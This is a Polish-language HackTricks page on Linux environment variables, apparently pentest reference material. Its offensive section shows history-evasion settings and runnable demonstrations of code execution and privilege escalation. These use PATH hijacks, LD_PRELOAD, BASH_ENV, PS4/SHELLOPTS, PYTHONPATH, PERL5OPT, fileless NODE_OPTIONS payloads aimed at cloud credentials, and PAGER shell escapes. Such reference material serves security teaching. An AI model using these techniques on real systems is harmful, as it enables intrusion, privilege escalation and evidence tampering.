# Zmienne środowiskowe w Linuksie

{{#include ../../banners/hacktricks-training.md}}

## Zmienne globalne

Zmienne globalne **będą** dziedziczone przez **procesy potomne**.

Możesz utworzyć zmienną globalną dla bieżącej sesji, wykonując:

```bash
export MYGLOBAL="hello world"
echo $MYGLOBAL #Prints: hello world
```

Ta zmienna będzie dostępna w bieżących sesjach i ich procesach potomnych.

Możesz **usunąć** zmienną, wykonując:

```bash
unset MYGLOBAL
```

## Zmienne lokalne

**Zmienne lokalne** mogą być **dostępne** tylko dla **bieżącej powłoki/skryptu**.

```bash
LOCAL="my local"
echo $LOCAL
unset LOCAL
```

## Wyświetlanie aktualnych zmiennych

```bash
set
env
printenv
cat /proc/$$/environ
cat /proc/`python -c "import os; print(os.getppid())"`/environ
```

Zawartość `/proc/*/environ` jest **rozdzielona znakami NUL**, więc te warianty są zwykle łatwiejsze do odczytania:

```bash
tr '\0' '\n' </proc/$$/environ | sort -u
tr '\0' '\n' </proc/<PID>/environ | sort -u
```

Jeśli szukasz **danych uwierzytelniających** lub **interesującej konfiguracji usług** w odziedziczonych środowiskach, sprawdź również [Linux Post Exploitation](../post-exploitation/README.md).

## Typowe zmienne

Źródło: [https://geek-university.com/linux/common-environment-variables/](https://geek-university.com/linux/common-environment-variables/).<sup>[[5]](#references)</sup>

- **DISPLAY** – ekran używany przez **X**. Ta zmienna jest zwykle ustawiona na **:0.0**, co oznacza pierwszy ekran na bieżącym komputerze.
- **EDITOR** – preferowany edytor tekstu użytkownika.
- **HISTFILESIZE** – maksymalna liczba wierszy w pliku historii.
- **HISTSIZE** – liczba wierszy dodawanych do pliku historii po zakończeniu sesji przez użytkownika.
- **HOME** – katalog domowy użytkownika.
- **HOSTNAME** – nazwa hosta komputera.
- **LANG** – bieżący język.
- **MAIL** – lokalizacja pliku kolejki pocztowej użytkownika. Zwykle **/var/spool/mail/USER**.
- **MANPATH** – lista katalogów, w których wyszukiwane są strony podręcznika.
- **OSTYPE** – typ systemu operacyjnego.
- **PS1** – domyślny prompt w bash.
- **PATH** – przechowuje ścieżki do wszystkich katalogów zawierających pliki binarne, które chcesz uruchamiać, podając jedynie nazwę pliku, a nie ścieżkę względną lub bezwzględną.
- **PWD** – bieżący katalog roboczy.
- **SHELL** – ścieżka do bieżącej powłoki poleceń (na przykład **/bin/bash**).
- **TERM** – typ bieżącego terminala (na przykład **xterm**).
- **TZ** – strefa czasowa użytkownika.
- **USER** – bieżąca nazwa użytkownika.

## Interesujące zmienne przy hackingu

Nie wszystkie zmienne są równie przydatne. Z perspektywy ofensywnej priorytetowo traktuj zmienne, które zmieniają **ścieżki wyszukiwania**, **pliki startowe**, **zachowanie dynamicznego konsolidatora** lub **audyt/rejestrowanie**.

### **HISTFILESIZE**

**Zmień wartość tej zmiennej na 0**, aby po **zakończeniu sesji** **plik historii** (\~/.bash_history) został **skrócony do 0 wierszy**.

```bash
export HISTFILESIZE=0
```

### **HISTSIZE**

Zmień **wartość tej zmiennej na 0**, aby polecenia **nie były przechowywane w historii w pamięci** ani zapisywane z powrotem do **pliku historii** (\~/.bash_history).

```bash
export HISTSIZE=0
```

### **HISTCONTROL**

Jeśli **wartość tej zmiennej jest ustawiona na `ignorespace` lub `ignoreboth`**, żadne polecenie poprzedzone dodatkową spacją nie zostanie zapisane w historii.

```bash
export HISTCONTROL=ignorespace
```

```bash
$ echo "to save or"
$  echo "not to save"
```

### **HISTFILE**

Ustaw **plik historii** na **`/dev/null`** albo całkowicie usuń tę zmienną. Zwykle jest to bardziej niezawodne niż samo zmienianie rozmiaru historii.

```bash
export HISTFILE=/dev/null
unset HISTFILE
```

### http_proxy & https_proxy

Procesy będą używać zadeklarowanego tutaj **proxy**, aby łączyć się z internetem przez **http lub https**.

```bash
export http_proxy="http://10.10.10.10:8080"
export https_proxy="http://10.10.10.10:8080"
```

### all_proxy & no_proxy

- `all_proxy`: domyślny proxy dla narzędzi/protokołów, które go obsługują.
- `no_proxy`: lista pomijanych hostów/domen/CIDR, z którymi należy łączyć się bezpośrednio.

```bash
export all_proxy="socks5h://10.10.10.10:1080"
export no_proxy="localhost,127.0.0.1,.corp.local,10.0.0.0/8"
```

Oba warianty — małe i wielkie litery — mogą być używane w zależności od narzędzia (`http_proxy`/`HTTP_PROXY`, `no_proxy`/`NO_PROXY`).

### SSL_CERT_FILE & SSL_CERT_DIR

Procesy będą ufać certyfikatom wskazanym w **tych zmiennych środowiskowych**. Przydaje się to do sprawienia, by narzędzia takie jak **`curl`**, **`git`**, klienci HTTP w Pythonie czy menedżery pakietów ufały CA kontrolowanemu przez atakującego (na przykład po to, by proxy przechwytujące ruch wyglądało na wiarygodne).

```bash
export SSL_CERT_FILE=/path/to/ca-bundle.pem
export SSL_CERT_DIR=/path/to/ca-certificates
```

### **PATH**

Jeśli uprzywilejowany wrapper/skrypt wykonuje polecenia **bez ścieżek bezwzględnych**, wygrywa **pierwszy katalog kontrolowany przez atakującego** w `PATH`. To podstawowy mechanizm wielu **PATH hijacks** w `sudo`, zadaniach cron, wrapperach powłoki i niestandardowych helperach SUID. Szukaj `env_keep+=PATH`, słabej konfiguracji `secure_path` lub wrapperów, które wywołują `tar`, `service`, `cp`, `python` itp. po nazwie.

```bash
mkdir -p /dev/shm/bin
cat > /dev/shm/bin/tar <<'EOF'
#!/bin/sh
echo '[+] PATH hijack reached' >&2
id
EOF
chmod +x /dev/shm/bin/tar
PATH=/dev/shm/bin:$PATH vulnerable-wrapper
```

W przypadku pełnych łańcuchów eskalacji uprawnień wykorzystujących `PATH` sprawdź [Linux Privilege Escalation](linux-privilege-escalation/README.md).

### **HOME & XDG_CONFIG_HOME**

`HOME` to nie tylko odwołanie do katalogu: wiele narzędzi automatycznie wczytuje **pliki dotfiles**, **wtyczki** i **konfigurację użytkownika** z `$HOME` lub `$XDG_CONFIG_HOME`. Jeśli uprzywilejowany przepływ pracy zachowuje te wartości, **config injection** może być łatwiejsze niż przejęcie binarnego pliku.

```bash
export HOME=/dev/shm/fakehome
export XDG_CONFIG_HOME=/dev/shm/fakehome/.config
mkdir -p "$XDG_CONFIG_HOME"
```

Ciekawe cele obejmują `.gitconfig`, `.wgetrc`, `.curlrc`, `.inputrc`, `.pythonrc.py` oraz pliki specyficzne dla narzędzi, takie jak `.terraformrc`.

### **LD_PRELOAD, LD_LIBRARY_PATH & LD_AUDIT**

Te zmienne wpływają na **dynamic linker**:

- `LD_PRELOAD`: wymusza wcześniejsze załadowanie dodatkowych obiektów współdzielonych.
- `LD_LIBRARY_PATH`: dodaje katalogi do przeszukiwania bibliotek na początku listy.
- `LD_AUDIT`: ładuje biblioteki audytujące, które obserwują ładowanie bibliotek i rozwiązywanie symboli.

Są niezwykle przydatne do **hooking**, **instrumentation** i **privilege escalation**, jeśli uprzywilejowane polecenie je zachowuje. W trybie **secure-execution** (`AT_SECURE`, np. setuid/setgid/capabilities) loader usuwa lub ogranicza wiele z tych zmiennych. Błędy parsera na tym wczesnym etapie działania loadera nadal jednak mogą mieć poważne skutki, ponieważ występują **przed** uruchomieniem programu docelowego.<sup>[[2]](#references)</sup>

```bash
env | grep -E '^LD_'
ldso=$(ls /lib64/ld-linux-*.so.* /lib/*-linux-gnu/ld-linux-*.so.* 2>/dev/null | head -n1)
"$ldso" --list-diagnostics /bin/true | head
"$ldso" --list-tunables /bin/true | head
```

### **GLIBC_TUNABLES**

`GLIBC_TUNABLES` zmienia wczesne zachowanie glibc (na przykład ustawienia alokatora) i jest bardzo przydatne w labach exploitów. Ma też znaczenie z perspektywy bezpieczeństwa, ponieważ **dynamic loader parsuje tę zmienną bardzo wcześnie**. Błąd **Looney Tunables** z 2023 roku przypomniał, że pojedyncza zmienna środowiskowa parsowana przez loader może stać się **lokalnym prymitywem eskalacji uprawnień** w przypadku programów SUID.<sup>[[6]](#references)</sup>

W przypadku CVE-2023-4911 porównaj **wersję wydania zainstalowanego pakietu dystrybucji** z wersją zawierającą poprawkę wydaną przez dostawcę i sprawdź, którego loadera faktycznie używają nowe procesy. Sam numer wersji upstream jest niewiarygodny: Debian wprowadził podatny parser do swojego pakietu 2.31, a dystrybucje backportowały poprawki bez zmiany numeru upstream. Do praktycznej zmiany uprawnień potrzebny jest również uprzywilejowany plik wykonywalny, którego zmiana tożsamości nie jest blokowana przez `NoNewPrivs`, montowanie `nosuid` ani inne zabezpieczenie. Podczas pasywnej enumeracji unikaj uruchamiania sondy, która może spowodować awarię, z nieprawidłowym `GLIBC_TUNABLES`. Informacje o tym, czy dana wersja jest objęta podatnością, znajdziesz w [trackerze Ubuntu](https://ubuntu.com/security/CVE-2023-4911), [trackerze Debiana](https://security-tracker.debian.org/tracker/CVE-2023-4911) i [advisory Red Hat](https://access.redhat.com/security/cve/cve-2023-4911); [notatka bezpieczeństwa Ubuntu](https://ubuntu.com/security/notices/USN-6409-1) zaleca również ponowne uruchomienie systemu po aktualizacji.

```bash
GLIBC_TUNABLES=glibc.malloc.tcache_count=0 ./binary
```

### **BASH_ENV & ENV**

Jeśli **Bash** jest uruchamiany **nieinteraktywnie**, sprawdza `BASH_ENV` i wykonuje wskazany plik przed uruchomieniem docelowego skryptu. Gdy Bash jest wywoływany jako `sh` lub w interaktywnym trybie POSIX, może też sprawdzać `ENV`. To klasyczny sposób na uzyskanie code execution przez shell wrapper, jeśli atakujący kontroluje środowisko.

```bash
cat > /tmp/pre.sh <<'EOF'
echo '[+] sourced before the target script'
EOF
BASH_ENV=/tmp/pre.sh bash -c 'echo target'
```

Bash ignoruje te pliki startowe, gdy **rzeczywiste i efektywne identyfikatory różnią się**; opcja `-p` zachowuje efektywny identyfikator, ale nie włącza tych plików startowych, więc dokładne zachowanie zależy od tego, jak wrapper uruchamia powłokę. Zachowaj ostrożność w przypadku uprzywilejowanych wrapperów, które wywołują `setuid()`/`setgid()` **przed** uruchomieniem Basha: gdy identyfikatory znów będą zgodne, Bash może zaufać `BASH_ENV`, `ENV` i powiązanemu stanowi powłoki, które w przeciwnym razie zostałyby zignorowane.<sup>[[1]](#references)</sup>

### **PS4 + SHELLOPTS (xtrace)**

Gdy Bash działa z włączonym **xtrace**, rozwija `PS4` i wyświetla jego wartość przed każdym śledzonym poleceniem. `PS4` jest rozwijane tak jak prompt, więc wykonywane jest zawarte w nim **podstawienie polecenia**. Co istotne, xtrace można włączyć wyłącznie przez środowisko, eksportując `SHELLOPTS=xtrace` — nie trzeba podawać `-x` w wierszu poleceń — dzięki czemu każdy skrypt Basha uruchomiony przez ofiarę staje się wektorem wykonania kodu.<sup>[[7]](#references)</sup>

```bash
echo 'echo target' > /tmp/victim.sh

# Pure environment-variable injection (no -x flag)
SHELLOPTS=xtrace PS4='$(id > /tmp/ps4-executed)' bash /tmp/victim.sh
cat /tmp/ps4-executed

# Same primitive when a job is run with debugging enabled
PS4='$(touch /tmp/ps4-x)' bash -x /tmp/victim.sh
```

`PS4` nie robi nic, dopóki nie zostanie włączone xtrace (`SHELLOPTS=xtrace`, `set -x` lub `bash -x`), a Bash usuwa `SHELLOPTS` w kontekstach uprzywilejowanych/setuid, tak samo jak `BASH_ENV`.

### **PYTHONPATH, PYTHONHOME, PYTHONSTARTUP, PYTHONINSPECT & PYTHONBREAKPOINT**

Te zmienne zmieniają sposób uruchamiania Pythona:

- `PYTHONPATH`: dodaje ścieżki wyszukiwania modułów na początku listy.
- `PYTHONHOME`: zmienia lokalizację drzewa biblioteki standardowej.
- `PYTHONSTARTUP`: wykonuje plik przed wyświetleniem interaktywnego promptu.
- `PYTHONINSPECT=1`: przechodzi do trybu interaktywnego po zakończeniu skryptu.
- `PYTHONBREAKPOINT`: `package.module.callable` jest wywoływane (a jego moduł importowany), gdy kod napotka `breakpoint()`.<sup>[[8]](#references)</sup>

Są przydatne w przypadku skryptów konserwacyjnych, debuggerów, powłok i wrapperów, które uruchamiają Pythona ze środowiskiem, na które można wpływać. `python -E` i `python -I` ignorują wszystkie zmienne `PYTHON*`.

```bash
mkdir -p /tmp/pylib
printf 'print("owned from PYTHONPATH")\n' > /tmp/pylib/htmod.py
PYTHONPATH=/tmp/pylib python3 -c 'import htmod'
PYTHONPATH=/tmp/pylib python3 -I -c 'import htmod'   # ignored in isolated mode

# PYTHONBREAKPOINT: runs when the target reaches breakpoint()
printf 'import sys\nbreakpoint(*sys.argv[1:])\n' > /tmp/bp.py
PYTHONBREAKPOINT='os.system' python3 /tmp/bp.py 'id'   # requires the code to hit breakpoint()
```

Niedawnym przykładem z rzeczywistego świata było LPE w **needrestart** z 2024 roku w systemach Ubuntu/Debian: należący do roota skaner skopiował `PYTHONPATH` nieuprzywilejowanego procesu z `/proc/<PID>/environ`, a następnie uruchomił Pythona. Opublikowany exploit umieścił `importlib/__init__.so` w ścieżce kontrolowanej przez atakującego, dzięki czemu Python wykonał kod atakującego podczas własnej inicjalizacji, zanim w ogóle miało znaczenie, jaki skrypt wskazano w helperze.<sup>[[3]](#references)</sup>

### **PERL5OPT & PERL5LIB**

Perl ma równie przydatne zmienne startowe:

- `PERL5LIB`: dodaje katalogi bibliotek na początku ścieżki wyszukiwania.
- `PERL5OPT`: wstrzykuje przełączniki tak, jakby były podane w wierszu poleceń każdego polecenia `perl`.

Może to wymusić **automatyczne ładowanie modułów** lub zmienić zachowanie interpretera, zanim skrypt docelowy zrobi cokolwiek interesującego. Perl ignoruje te zmienne w kontekstach **taint / setuid / setgid**, ale nadal mają one duże znaczenie w przypadku zwykłych wrapperów uruchamianych przez roota, zadań CI, instalatorów i niestandardowych reguł sudoers.

Jeśli reguła sudo zezwala na nadpisywanie zmiennych środowiskowych, a uprzywilejowane polecenie ostatecznie uruchamia Perla, sprawdź również `PERL5DB`. Dokumentacja Perla podaje, że `PERL5OPT=-d` uruchamia debugger, a `PERL5DB` dostarcza kodu inicjalizującego debugger, gdy Perl startuje z samym przełącznikiem `-d`. Usunięcie tylko `PERL5LIB` i `PERLLIB` nie zamyka tej drogi. Zmienne muszą przetrwać sudo i wrapper, a proces Perla nie może ich ignorować z powodu obsługi taint lub set-ID; podczas enumeracji sprawdź dokładną regułę i łańcuch wykonania, nie uruchamiając uprzywilejowanego helpera. Zobacz [perlrun's environment-variable reference](https://perldoc.perl.org/perlrun#ENVIRONMENT).

Wbudowana ścieżka wyszukiwania Perla [`@INC` search path](https://perldoc.perl.org/perlvar#@INC) to kolejna granica zaufania modułów, nawet gdy zmienne środowiskowe nie są zachowywane. W przypadku uprzywilejowanego procesu Perla powiąż rzeczywistą instrukcję `use` lub `require` z rozwiązaną nazwą modułu, kolejnością wyszukiwania oraz możliwością utworzenia lub podmiany tego modułu przez użytkownika o niższych uprawnieniach w jednym z przeszukiwanych katalogów. Sam fakt, że katalog biblioteki jest zapisywalny, nie dowodzi, że uprzywilejowany proces załaduje z niego kod.

```bash
mkdir -p /tmp/perllib
cat > /tmp/perllib/HT.pm <<'EOF'
package HT;
BEGIN { print "PERL5OPT_TRIGGERED\n" }
1;
EOF
PERL5LIB=/tmp/perllib PERL5OPT=-MHT perl -e 'print "target\n"'
```

### **NODE_OPTIONS**

`NODE_OPTIONS` dodaje **flagi CLI Node.js** na początku poleceń każdego procesu `node`, który dziedziczy to środowisko. Dzięki temu może być przydatne w przypadku wrapperów, zadań CI, procesów pomocniczych Electron oraz reguł sudo, które ostatecznie uruchamiają Node. Z perspektywy ofensywnej najciekawsze flagi to zazwyczaj:

- `--require <file>`: wstępnie ładuje plik CommonJS przed skryptem docelowym.
- `--import <module>`: wstępnie ładuje moduł ES przed skryptem docelowym.

Node odrzuca niektóre niebezpieczne flagi w `NODE_OPTIONS`, ale `--require` i `--import` są wyraźnie dozwolone i przetwarzane **przed** zwykłymi argumentami wiersza poleceń.<sup>[[4]](#references)</sup>

```bash
cat > /tmp/preload.js <<'EOF'
console.error('[+] NODE_OPTIONS preload reached')
EOF
NODE_OPTIONS='--require /tmp/preload.js' node -e 'console.log("target")'
```

#### Bezplikowy preload z użyciem URL `data:`

Gdy możesz ustawić `NODE_OPTIONS`, ale **nie możesz zapisać pliku** na celu (system plików tylko do odczytu, ograniczone API, środowisko serverless itp.), `--import` akceptuje URL `data:text/javascript,`, dzięki czemu cały payload znajduje się w samej zmiennej środowiskowej. JavaScript musi być **w pełni zakodowany w URL** — Node parsuje tę wartość jako URL, więc każda niezakodowana spacja (lub inny znak) ucina payload i powoduje błąd `SyntaxError`. Działa to w Node 20.6+, gdzie `--import` znajduje się na allowliście `NODE_OPTIONS`.<sup>[[4]](#references)</sup>

```bash
# fileless proof of execution (note: no raw spaces in the data URL)
NODE_OPTIONS='--import data:text/javascript,console.log(%22fileless_preload%22)' node -e 'console.log("target")'

# Real payload, URL-encoded (run a command / exfiltrate env vars)
PAYLOAD=$(python3 - <<'PY'
import urllib.parse
js = "import('child_process').then(cp=>console.log(cp.execSync('id').toString()))"
print("--import data:text/javascript," + urllib.parse.quote(js, safe=""))
PY
)
NODE_OPTIONS="$PAYLOAD" node -e 'console.log("target")'
```

> [!TIP]
> To częsty sposób na przekształcenie kontroli nad `NODE_OPTIONS` w RCE w **zarządzanych środowiskach uruchomieniowych w chmurze**, których funkcje działają na Node. Na przykład atakujący, który może jedynie zmienić konfigurację Lambdy (`lambda:UpdateFunctionConfiguration`, bez `iam:PassRole` i bez aktualizacji kodu), może wstrzyknąć `NODE_OPTIONS=--import data:text/javascript,<payload>`, aby uruchomić kod wewnątrz funkcji i wykraść poświadczenia jej roli wykonawczej. Wstrzyknięty moduł uruchamia się **przed** handlerem, który następnie nadal wykonuje się normalnie.

W przypadku zdalnych łańcuchów gadgetów, które pośrednio ustawiają `NODE_OPTIONS` (na przykład prototype pollution prowadzące do RCE), sprawdź [tę stronę](../../pentesting-web/deserialization/nodejs-proto-prototype-pollution/prototype-pollution-to-rce.md).

### **RUBYLIB & RUBYOPT**

Ruby oferuje tę samą klasę nadużyć podczas uruchamiania:

- `RUBYLIB`: dodaje katalogi na początku ścieżki ładowania Ruby.
- `RUBYOPT`: wstrzykuje opcje wiersza poleceń, takie jak `-r`, do każdego wywołania `ruby`.

```bash
mkdir -p /tmp/rubylib
printf 'warn "[+] RUBYOPT preload reached"\n' > /tmp/rubylib/ht.rb
RUBYLIB=/tmp/rubylib RUBYOPT='-rht' ruby -e 'puts :target'
```

Podatności **needrestart** z 2024 roku pokazały, że nie jest to tylko sztuczka laboratoryjna: ten sam pomocnik należący do root, który był podatny na nadużycie `PYTHONPATH`, można było również skłonić do uruchomienia Ruby z kontrolowaną przez atakującego zmienną `RUBYLIB`, co powodowało załadowanie `enc/encdb.so` z katalogu atakującego.<sup>[[3]](#references)</sup>

### **VIMINIT & EXINIT**

Podczas normalnego uruchamiania Vim/Neovim wykonuje polecenia Ex zawarte w `VIMINIT` (lub w zmiennej `EXINIT`, używanej jako fallback). Polecenia Ex obejmują `:!cmd` i `:call system(...)`, więc kontrolowanie tej zmiennej umożliwia wykonanie kodu za każdym razem, gdy ofiara otworzy Vim (np. uruchomi `sudo vim` jako root, `crontab -e`, `visudo` albo gdy `git`/`less` uruchomi `$EDITOR`).<sup>[[9]](#references)</sup>

```bash
echo hi > /tmp/victim.txt
printf ':qa!\n' | VIMINIT='silent! !touch /tmp/vim-executed' vim /tmp/victim.txt
test -e /tmp/vim-executed && echo 'VIMINIT executed'
```

Tryb wsadowy (`vim -es`/`-Es`) pomija te zmienne, ale podczas normalnego interaktywnego uruchamiania są one wykonywane.

### **PowerShell (pwsh): PSModulePath, DOTNET_STARTUP_HOOKS i profiler CLR**

PowerShell Core (`pwsh`) działa w systemach Linux/macOS (i Windows) i jest **aplikacją .NET**, więc kilka zmiennych środowiskowych sprawia, że każde wywołanie `pwsh` z odziedziczonym środowiskiem może prowadzić do code execution — co jest przydatne w przypadku zadań cron/systemd, runnerów CI i uprzywilejowanych wrapperów uruchamiających `pwsh`.

- `PSModulePath`: PowerShell rekurencyjnie przeszukuje każdy katalog z tej listy w poszukiwaniu modułów `.psd1`/`.psm1` i **automatycznie ładuje** moduł, gdy po raz pierwszy zostanie odwołana komenda, którą on eksportuje. Dodaj katalog na początku listy, a kod najwyższego poziomu modułu wykona się podczas importowania; ponieważ kolejność rozwiązywania nazw to *Alias → Function → Cmdlet*, eksportowana funkcja może nawet przesłonić wbudowany cmdlet wywoływany przez ofiarę.<sup>[[10]](#references)</sup>
- `XDG_CONFIG_HOME`: zmienia lokalizację `powershell/Microsoft.PowerShell_profile.ps1`, wykonywanego podczas uruchamiania (chyba że podano `-NoProfile`).
- `DOTNET_STARTUP_HOOKS`: zarządzany assembly, którego `StartupHook.Initialize()` uruchamia się przed `Main` (wspólny dla wszystkich aplikacji .NET).
- `CORECLR_ENABLE_PROFILING=1` + `CORECLR_PROFILER={guid}` + `CORECLR_PROFILER_PATH=/path/evil.so`: API profilowania CLR ładuje bibliotekę atakującego do procesu podczas uruchamiania (zmienne ścieżek mają pierwszeństwo przed rejestrem; `DOTNET_*` to nowszy alias). W Windows PowerShell 5.1 (.NET Framework) użyj `COR_ENABLE_PROFILING`/`COR_PROFILER`/`COR_PROFILER_PATH`. MITRE ATT&CK T1574.012.<sup>[[11]](#references)</sup>

```bash
# PSModulePath module auto-load hijack
mkdir -p /tmp/evil/Hijack
printf 'New-Item -ItemType File /tmp/ps-mod-exec -Force|Out-Null\nfunction Invoke-Report{}\nExport-ModuleMember -Function Invoke-Report\n' > /tmp/evil/Hijack/Hijack.psm1
printf "@{ModuleVersion='1.0';RootModule='Hijack.psm1';FunctionsToExport=@('Invoke-Report')}\n" > /tmp/evil/Hijack/Hijack.psd1
PSModulePath="/tmp/evil:$PSModulePath" pwsh -Command 'Invoke-Report'
test -e /tmp/ps-mod-exec && echo 'PSModulePath auto-load executed'
```

W systemie Windows `PSExecutionPolicyPreference=Bypass` dodatkowo wyłącza zabezpieczenie blokujące niepodpisane skrypty, dzięki czemu podstawiony profil/moduł faktycznie zostaje uruchomiony. Pełne PoC znajdują się na dedykowanej stronie:

{{#ref}}
../../macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/macos-powershell-applications-injection.md
{{#endref}}

### **PAGER, MANPAGER, GIT_PAGER, GIT_EDITOR & LESSOPEN**

Niektóre narzędzia nie tylko odczytują ścieżkę ze środowiska — przekazują wartość do **shella**, **edytora** lub **preprocesora wejścia**. Dlatego poniższe zmienne są szczególnie interesujące, gdy uprzywilejowany wrapper uruchamia `git`, `man`, `less` lub podobne przeglądarki tekstu:

- `PAGER`, `MANPAGER`, `GIT_PAGER`: wybierają polecenie pagera.
- `GIT_EDITOR`, `VISUAL`, `EDITOR`: wybierają polecenie edytora, często wraz z argumentami.
- `LESSOPEN`, `LESSCLOSE`: definiują preprocesory/postprocesory uruchamiane podczas otwierania pliku przez `less`.

```bash
PAGER='sh -c "exec sh 0<&1 1>&1"' man man

cat > /tmp/lesspipe.sh <<'EOF'
#!/bin/sh
echo '[+] LESSOPEN triggered' >&2
cat "$1"
EOF
chmod +x /tmp/lesspipe.sh
LESSOPEN='|/tmp/lesspipe.sh %s' less /etc/hosts
```

Git obsługuje również **wstrzykiwanie konfiguracji wyłącznie przez zmienne środowiskowe** bez zapisywania czegokolwiek na dysku za pomocą `GIT_CONFIG_COUNT`, `GIT_CONFIG_KEY_<n>` i `GIT_CONFIG_VALUE_<n>`:

```bash
GIT_CONFIG_COUNT=1 \
GIT_CONFIG_KEY_0=core.pager \
GIT_CONFIG_VALUE_0='sh -c "exec sh 0<&1 1>&1"' \
git -p help
```

Z perspektywy post-exploitation pamiętaj też, że odziedziczone środowisko często zawiera **dane uwierzytelniające**, **ustawienia proxy**, **tokeny usług** lub **klucze do chmury**. Zobacz [Linux Post Exploitation](../post-exploitation/README.md), aby dowiedzieć się o `/proc/<PID>/environ` i poszukiwaniu `Environment=` w `systemd`.

### PS1

Zmień wygląd swojego promptu.

[**Oto przykład**](https://gist.github.com/carlospolop/43f7cd50f3deea972439af3222b68808)

Użytkownik root:

![PERL5OPT & PERL5LIB - PS1: Oto przykład](<../images/image (897).png>)

Zwykły użytkownik:

![PERL5OPT & PERL5LIB - PS1: Jedno, dwa i trzy zadania uruchomione w tle](<../images/image (740).png>)

Jedno, dwa i trzy zadania uruchomione w tle:

![PERL5OPT & PERL5LIB - PS1: Jedno, dwa i trzy zadania uruchomione w tle](<../images/image (145).png>)

Jedno zadanie w tle, jedno zatrzymane, a ostatnie polecenie nie zakończyło się poprawnie:

![PERL5OPT & PERL5LIB - PS1: Jedno zadanie w tle, jedno zatrzymane, a ostatnie polecenie nie zakończyło się poprawnie](<../images/image (715).png>)

## References

- [1] [Podręcznik GNU Bash - Pliki startowe Bash](https://www.gnu.org/software/bash/manual/html_node/Bash-Startup-Files.html)
- [2] [ld.so(8) - strona podręcznika Linuksa](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [3] [Qualys - LPE w needrestart](https://www.qualys.com/2024/11/19/needrestart/needrestart.txt)
- [4] [Dokumentacja Node.js CLI - `NODE_OPTIONS`](https://nodejs.org/api/cli.html)
- [5] [Typowe zmienne środowiskowe - Geek University](https://geek-university.com/linux/common-environment-variables/)
- [6] [CVE-2023-4911: Looney Tunables - lokalna eskalacja uprawnień w ld.so biblioteki glibc - Qualys](https://blog.qualys.com/vulnerabilities-threat-research/2023/10/03/cve-2023-4911-looney-tunables-local-privilege-escalation-in-the-glibcs-ld-so)
- [7] [Podręcznik GNU Bash - zmienne Bash (`PS4`) i wbudowane polecenie Set (`xtrace`/`SHELLOPTS`)](https://www.gnu.org/software/bash/manual/html_node/Bash-Variables.html)
- [8] [PEP 553 - Wbudowana funkcja breakpoint() i PYTHONBREAKPOINT](https://peps.python.org/pep-0553/)
- [9] [Dokumentacja Vim - starting.txt (`VIMINIT`, `EXINIT`)](https://vimhelp.org/starting.txt.html#initialization)
- [10] [about_PSModulePath i automatyczne ładowanie modułów PowerShell](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_psmodulepath)
- [11] [Ustawienia konfiguracji debugowania i profilowania .NET (zmienne profilera `CORECLR_`/`DOTNET_`/`COR_`)](https://learn.microsoft.com/en-us/dotnet/core/runtime-config/debugging-profiling)
{{#include ../../banners/hacktricks-training.md}}
